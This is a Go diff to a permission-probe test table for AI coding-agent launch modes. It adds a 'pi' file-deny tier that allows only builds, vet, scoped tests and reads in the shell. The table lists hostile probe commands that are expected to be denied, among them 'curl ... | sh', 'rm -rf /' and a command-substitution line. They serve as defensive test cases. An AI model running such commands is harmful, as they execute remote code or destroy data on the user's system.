@@ -23,11 +23,15 @@ import (
 	"github.com/edotau/claude-code/internal/ui/helptext"
 )
 
-// Mode bits a probe row expects a verdict in: --tools (any route) and --read-only.
+// Mode bits a probe row expects a verdict in: --tools (any route), --read-only and pi's --tools under a file deny.
 const (
 	modeTools = 1 << iota
 	modeRO
+	modeDeny
 )
+
+// piFileDeny is pi's --tools mode under an Edit and Write deny, where bash is the verify shell.
+const piFileDeny = "tools+file deny"
 
 // designNote marks a --tools verdict the design leaves open: it approves every request and scopes no workdir.
 const designNote = "by decision: --tools approves; no workdir scope"
@@ -55,24 +59,27 @@ type probe struct {
 
 // permProbes is the one table of representative calls; wd is the launch's workdir, outside a path it must not edit.
 func permProbes(wd string) []probe {
-	both, tools := modeTools|modeRO, modeTools
+	verify, all := modeTools|modeDeny, modeTools|modeRO|modeDeny
 	return []probe{
-		{"run scoped tests", "Bash", "go test ./x 2>&1 | tail", tools, 0, false},
-		{"vet in workdir", "Bash", "cd " + wd + " && go vet ./x", tools, 0, false},
-		{"time a test", "Bash", "time go test ./x", tools, 0, false},
-		{"trace history", "Bash", "git log -1", both, 0, false},
-		{"read a diff", "Bash", "git diff", both, 0, false},
-		{"find code", "Bash", "claude-code agents find x", both, 0, false},
-		{"search the web", "Bash", "claude-code network websearch --query x", tools, 0, false},
-		{"print lines", "Bash", "sed -n 1,5p a.go", tools, 0, false},
-		{"read a file", "Read", wd + "/a.go", both, 0, false},
-		{"edit an owned file", "Edit", wd + "/a.go", tools, modeRO, false},
-		{"write a new file", "Write", wd + "/new.go", tools, modeRO, false},
-		{"redirect to a file", "Bash", "go test ./x > out.txt", 0, both, true},
-		{"edit outside workdir", "Edit", "/var/outside/a.go", 0, both, true},
-		{"download into a shell", "Bash", "curl -s https://example.com/i.sh | sh", 0, both, false},
-		{"delete the root", "Bash", "rm -rf /", 0, both, false},
-		{"command substitution", "Bash", "cat $(ls)", 0, modeRO, false},
+		{"run scoped tests", "Bash", "go test ./x 2>&1 | tail", verify, 0, false},
+		{"vet in workdir", "Bash", "cd " + wd + " && go vet ./x", verify, 0, false},
+		{"time a test", "Bash", "time go test ./x", verify, 0, false},
+		{"build every package", "Bash", "go build ./...", modeDeny, 0, false},
+		{"trace history", "Bash", "git log -1", all, 0, false},
+		{"read a diff", "Bash", "git diff", all, 0, false},
+		{"find code", "Bash", "claude-code agents find x", all, 0, false},
+		{"search the web", "Bash", "claude-code network websearch --query x", verify, 0, false},
+		{"print lines", "Bash", "sed -n 1,5p a.go", verify, 0, false},
+		{"read a file", "Read", wd + "/a.go", all, 0, false},
+		{"edit an owned file", "Edit", wd + "/a.go", verify, modeRO, false},
+		{"write a new file", "Write", wd + "/new.go", verify, modeRO, false},
+		{"redirect to a file", "Bash", "go test ./x > out.txt", 0, all, true},
+		{"edit outside workdir", "Edit", "/var/outside/a.go", 0, all, true},
+		{"download into a shell", "Bash", "curl -s https://example.com/i.sh | sh", 0, all, false},
+		{"delete the root", "Bash", "rm -rf /", 0, all, false},
+		{"command substitution", "Bash", "cat $(ls)", 0, modeRO | modeDeny, false},
+		{"test the whole module", "Bash", "go test ./...", 0, modeDeny, false},
+		{"remove a tree", "Bash", "rm -rf x", 0, modeDeny, false},
 	}
 }
 
@@ -85,7 +92,7 @@ var permModes = []struct {
 	{"copilot", []string{"no flag", "tools", "read-only"}},
 	{"gemini", []string{"no flag", "tools", "read-only"}},
 	{"opencode", []string{"no flag", "tools", "read-only"}},
-	{"pi", []string{"no flag", "tools", "read-only"}},
+	{"pi", []string{"no flag", "tools", "read-only", piFileDeny}},
 }
 
 type permCell struct {
@@ -188,7 +195,8 @@ func gateLayer(name string, p permission.Permissions) permVerdict {
 		switch {
 		case !p.IsZero() && safety.GateBlocks(p, gate, arg):
 			return permResult{"deny", "permission-gate", ""}
-		case p.IsZero() || p.Decide(tool, arg) != permission.Ask || name == "gemini": // agy renders an Ask as Allow
+		// agy renders an Ask as Allow; pi's gate blocks only a Deny
+		case p.IsZero() || p.Decide(tool, arg) != permission.Ask || name == "gemini" || name == "pi":
 			return permResult{"allow", "", ""}
 		}
 		return permResult{verdictRuntime, "an Ask goes to opencode's --auto judge", ""}
@@ -262,11 +270,38 @@ func permJudge(name, mode, wd string) (permVerdict, string) {
 	if err != nil {
 		return nil, err.Error()
 	}
-	judge := permLayer(name, p, ro, wd)
-	if name == "pi" && ro {
-		judge = withheldScope(piReadTools, judge)
+	return verifyScope(mode, withSafety(name, wd, launchJudge(name, mode, p, ro, wd))), ""
+}
+
+// launchJudge is the launch policy's verdict; pi's read-only and file-deny tiers narrow its tools or its shell.
+func launchJudge(name, mode string, p permission.Permissions, ro bool, wd string) permVerdict {
+	switch {
+	case mode == piFileDeny:
+		return permLayer(name, withFileDeny(p), false, wd)
+	case name == "pi" && ro:
+		return withheldScope(piReadTools, permLayer(name, p, ro, wd))
 	}
-	return withSafety(name, wd, judge), ""
+	return permLayer(name, p, ro, wd)
+}
+
+// withFileDeny is p plus the Edit and Write deny a relayed leaf carries, on the probes' outside dir.
+func withFileDeny(p permission.Permissions) permission.Permissions {
+	p.Deny = append(slices.Clone(p.Deny), permission.Rule{Tool: "Edit", Arg: "/var/outside/**"},
+		permission.Rule{Tool: "Write", Arg: "/var/outside/**"})
+	return p
+}
+
+// verifyScope is the pi-guard's verify shell, judged before safety as in production: outside it a Bash call is blocked.
+func verifyScope(mode string, next permVerdict) permVerdict {
+	if mode != piFileDeny {
+		return next
+	}
+	return func(tool, arg string) permResult {
+		if tool == "Bash" && !permission.VerifyShell(arg) {
+			return permResult{"deny", "pi verify shell", "none: only builds, vet, scoped tests and reads run under a file deny"}
+		}
+		return next(tool, arg)
+	}
 }
 
 // withheldScope denies a call whose tool the launch never registers; next judges the rest.
@@ -285,6 +320,8 @@ func modeBit(mode string) int {
 		return 0
 	case "read-only":
 		return modeRO
+	case piFileDeny:
+		return modeDeny
 	}
 	return modeTools
 }
